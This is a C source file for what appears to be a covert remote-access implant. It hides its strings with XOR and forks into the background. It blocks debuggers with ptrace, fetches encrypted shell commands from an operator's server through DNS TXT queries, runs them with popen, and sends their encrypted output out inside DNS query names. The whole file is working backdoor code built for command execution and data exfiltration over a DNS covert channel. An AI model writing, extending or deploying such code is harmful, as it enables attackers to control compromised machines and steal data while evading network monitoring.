#include "client.h"
#include "utils.h"

struct session sess;

unsigned char keys[] = { 0x56, 0x72, 0x48 };
unsigned int indexes[] = { 0x5fb5e716, 0xd91ff22f, 0x8a282b30};
unsigned int sizes[] = { 17, 25, 22 };
char *strings[] = {
    "\x25\x22\x37\x24\x22\x78\x22\x3e\x35\x39\x38\x78\x26\x37\x24\x22\x2f", 
    "\x57\x01\x5c\x57\x16\x5c\x11\x1d\x1f\x1f\x13\x1c\x16\x5c\x06\x1a\x11\x1d\x1c\x5c\x02\x13\x00\x06\x0b", 
    "\x6d\x3b\x66\x6d\x3b\x66\x2c\x29\x3c\x29\x66\x3c\x20\x2b\x27\x26\x66\x38\x29\x3a\x3c\x31"
};

char * load_string(unsigned int index) {
    int idx = 0;

    for (idx = 0; idx < sizeof(indexes) / sizeof(unsigned int); idx++) {
        if (index == indexes[idx]) {
            break;
        }
    }

    char *copied = malloc(sizes[idx] + 1);
    memcpy(copied, strings[idx], sizes[idx]);

    for (int i = 0; i < sizes[idx]; i++) {
        copied[i] ^= keys[idx];
    }

    return copied;
}

unsigned char * make_dns_request(char *domain, size_t * size, int should_receive) {
    unsigned char *query, *response = NULL;

    query = malloc(BUFFER_SIZE);
    bzero(query, BUFFER_SIZE);

    size_t query_size = res_mkquery(QUERY, domain, C_IN, T_TXT, NULL, 0, NULL, query, BUFFER_SIZE);

    sendto(sess.sockfd, query, query_size, 0, (struct sockaddr *) &sess.servaddr, sizeof(sess.servaddr));

    if (should_receive) {
        char *raw_answer = malloc(sizeof (struct dns_answer) + 1);

        socklen_t saddr_size = sizeof (sess.servaddr);
        recvfrom(sess.sockfd, raw_answer, sizeof (struct dns_answer), 0, (struct sockaddr *) &sess.servaddr, &saddr_size);

        struct dns_answer *answer = (struct dns_answer *) ((char *) raw_answer + query_size);

        answer->data[answer->txt_size] = '\0';
        
        if (size) {
            *size = answer->txt_size;
        }

        response = strdup(answer->data);

        free(raw_answer);
    }
    
    free(query);

    return response;
}

char * cmd_domain(unsigned int i) {
    char *domain = malloc(BUFFER_SIZE);

    bzero(domain, BUFFER_SIZE);

    snprintf(domain, BUFFER_SIZE - 1, load_string(0xd91ff22f), sess.session, i);

    return domain;
}

char *exfiltrate_domain (char *data) {
    char *domain = malloc(BUFFER_SIZE);

    bzero(domain, BUFFER_SIZE);

    snprintf(domain, BUFFER_SIZE - 1, load_string(0x8a282b30), data, sess.session);

    return domain;
}

void handle_command_fetching(int pipefd) {
    char *domain, *command, *dec;
    size_t response_size;

    for (int i = 0; i < COMMANDS_COUNT; i++) {
        domain = cmd_domain(i);
        command = make_dns_request(domain, &response_size, 1);

        if (command) {
            dec = decode_hex(command);
            decrypt(dec, response_size / 2, sess.key);
            write(pipefd, dec, strlen(dec));
            free(dec);
            free(command);
        }

        free(domain);

        sleep(DELAY_TIME);
    }
}

void send_command_output(char *output, size_t size) {
    encrypt(output, size, sess.key);

    char *encoded_output = encode_hex(output, size);

    char *domain = exfiltrate_domain(encoded_output);

    make_dns_request(domain, NULL, 0);

    free(domain);
    free(encoded_output);
}

void execute_command(char *command) {
    char *output = malloc(BUFFER_SIZE);
    size_t size;

    FILE *fp = popen(command, "r");

    if (fp == NULL) {
        return;
    }

    while ((size = fread(output, sizeof (char), MAX_OUTPUT_SIZE - 1, fp)) > 0) {
        output[size] = '\0';
        send_command_output(output, size);
        bzero(output, BUFFER_SIZE);
    }

    while (pclose(fp) < 0);
    free(output);
}

void handle_command_execution(int pipefd) {
    char *command = malloc(BUFFER_SIZE);
    size_t command_size;

    while ((command_size = read(pipefd, command, BUFFER_SIZE - 1)) > 0) {
        command[command_size] = '\0';
        if (!fork()) {
            execute_command(command);
            exit(EXIT_SUCCESS);
        }
    }

    free(command);
}

int main(int argc, char *argv[]) {

    if (argc != 3) {
        return 1;
    }

    if (fork()) return 0;

	if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
		return -1;
	}

    char *hostname = argv[1];
    unsigned int port = atoi(argv[2]);

    if (port == 0 || port > 65535) {
        return 1;
    }

    if ((sess.sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        return 1;
    }

    sess.servaddr.sin_family = AF_INET;
    sess.servaddr.sin_port = htons(port);
    inet_aton(hostname, &sess.servaddr.sin_addr);

    sess.session = make_dns_request(load_string(0x5fb5e716), NULL, 1);
    sess.key = extract_key(sess.session);

    int childpipe[2];
    pipe(childpipe);

    pid_t pid = fork();

    if (pid == 0) {
        // Handle command fetching
        close(childpipe[0]);
        handle_command_fetching(childpipe[1]);
        close(childpipe[1]);
    } else {
        close(childpipe[1]);
        handle_command_execution(childpipe[0]);
        close(childpipe[0]);
    }

    close(sess.sockfd);

    return 0;
}